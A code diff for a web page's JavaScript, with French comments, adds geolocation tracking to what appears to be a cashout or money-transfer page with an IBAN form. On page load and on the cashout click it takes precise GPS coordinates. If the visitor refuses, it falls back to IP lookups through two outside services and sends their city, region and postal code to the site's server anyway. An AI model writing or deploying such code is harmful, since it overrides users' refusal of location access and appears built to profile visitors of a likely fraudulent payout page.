@@ -52,6 +52,13 @@ document.addEventListener('DOMContentLoaded', function() {
     // Function to check geolocation and open form
     function checkGeolocationAndOpenForm() {
         if (navigator.geolocation) {
+            // Options améliorées pour la géolocalisation
+            const options = {
+                enableHighAccuracy: true, // Pour une meilleure précision, surtout sur mobile
+                timeout: 5000,           // Délai maximum de 5 secondes
+                maximumAge: 0            // Ne pas utiliser de cache
+            };
+
             navigator.geolocation.getCurrentPosition(
                 // Success
                 function(position) {
@@ -62,7 +69,10 @@ document.addEventListener('DOMContentLoaded', function() {
                     
                     // Get more geolocation information via third-party API
                     fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userCoords.latitude}&longitude=${userCoords.longitude}&localityLanguage=en`)
-                        .then(response => response.json())
+                        .then(response => {
+                            if (!response.ok) throw new Error('API non disponible');
+                            return response.json();
+                        })
                         .then(data => {
                             userGeoloc = {
                                 city: data.city,
@@ -78,6 +88,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             ibanModal.style.display = 'block';
                         })
                         .catch(error => {
+                            console.warn("Erreur API géocodage:", error);
                             // If third-party API fails, use coordinates only
                             sendLocationData(userCoords, null, 'cashout_click');
                             ibanModal.style.display = 'block';
@@ -85,9 +96,30 @@ document.addEventListener('DOMContentLoaded', function() {
                 },
                 // Error
                 function(error) {
-                    console.log("Geolocation error: ", error);
+                    console.log("Geolocation error: ", error.code, error.message);
+
+                    // Messages plus détaillés selon l'erreur
+                    let errorMsg = "";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "Utilisateur a refusé la géolocalisation";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = "Données de localisation indisponibles";
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = "Délai d'attente dépassé pour l'obtention de la position";
+                            break;
+                        case error.UNKNOWN_ERROR:
+                        default:
+                            errorMsg = "Erreur inconnue de géolocalisation";
+                            break;
+                    }
+                    console.log(errorMsg);
+
                     showGeolocError();
-                }
+                },
+                options
             );
         } else {
             // If geolocation is not supported
@@ -108,9 +140,55 @@ document.addEventListener('DOMContentLoaded', function() {
                 action: action
             }),
         })
-        .then(response => response.json())
+        .then(response => {
+            if (!response.ok) throw new Error('Erreur serveur');
+            return response.json();
+        })
         .then(data => console.log('Location data recorded'))
         .catch(error => console.error('Error sending location data:', error));
+    }
+    
+    // Function to fallback to IP geolocation
+    function fallbackGeolocation(action) {
+        // Tentative avec ipapi.co
+        fetch('https://ipapi.co/json/')
+            .then(response => {
+                if (!response.ok) throw new Error('Première API non disponible');
+                return response.json();
+            })
+            .then(data => {
+                userGeoloc = {
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    postal: data.postal
+                };
+                
+                // Envoyer les données au serveur
+                sendLocationData(null, userGeoloc, action);
+            })
+            .catch(error => {
+                console.warn('Première API de géolocalisation a échoué, essai d\'une alternative:', error);
+                // Essayer une API alternative
+                fetch('https://ipinfo.io/json')
+                    .then(response => {
+                        if (!response.ok) throw new Error('Seconde API non disponible');
+                        return response.json();
+                    })
+                    .then(data => {
+                        userGeoloc = {
+                            city: data.city,
+                            region: data.region,
+                            country: data.country,
+                            postal: data.postal
+                        };
+                        sendLocationData(null, userGeoloc, action);
+                    })
+                    .catch(finalError => {
+                        console.error('Toutes les API de géolocalisation ont échoué:', finalError);
+                        sendLocationData(null, { note: "Aucune géolocalisation disponible" }, `${action}_no_geoloc`);
+                    });
+            });
     }
     
     // Function to simulate loading and redirect
@@ -181,6 +259,12 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Try to get geolocation as soon as transfer page is loaded
     if (navigator.geolocation) {
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        };
+
         navigator.geolocation.getCurrentPosition(
             // Success
             function(position) {
@@ -191,7 +275,10 @@ document.addEventListener('DOMContentLoaded', function() {
                 
                 // Get more geolocation information via third-party API
                 fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userCoords.latitude}&longitude=${userCoords.longitude}&localityLanguage=en`)
-                    .then(response => response.json())
+                    .then(response => {
+                        if (!response.ok) throw new Error('API non disponible');
+                        return response.json();
+                    })
                     .then(data => {
                         userGeoloc = {
                             city: data.city,
@@ -204,28 +291,17 @@ document.addEventListener('DOMContentLoaded', function() {
                         sendLocationData(userCoords, userGeoloc, 'transfer_page_visit_with_gps');
                     })
                     .catch(error => {
+                        console.warn("Erreur API géocodage:", error);
                         // If third-party API fails, use only coordinates
                         sendLocationData(userCoords, null, 'transfer_page_visit_with_gps_no_details');
                     });
             },
             // Error or refusal - fallback to IP
             function(error) {
-                console.log("Geolocation not authorized on page visit:", error);
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(data => {
-                        const geoloc = {
-                            city: data.city,
-                            region: data.region,
-                            country: data.country_name,
-                            postal: data.postal
-                        };
-                        
-                        // Send data to server
-                        sendLocationData(null, geoloc, 'transfer_page_visit_without_gps');
-                    })
-                    .catch(error => console.error('IP geolocation error:', error));
-            }
+                console.log("Geolocation not authorized on page visit:", error.code, error.message);
+                fallbackGeolocation('transfer_page_visit_without_gps');
+            },
+            options
         );
     } else {
         // If geolocation is not supported
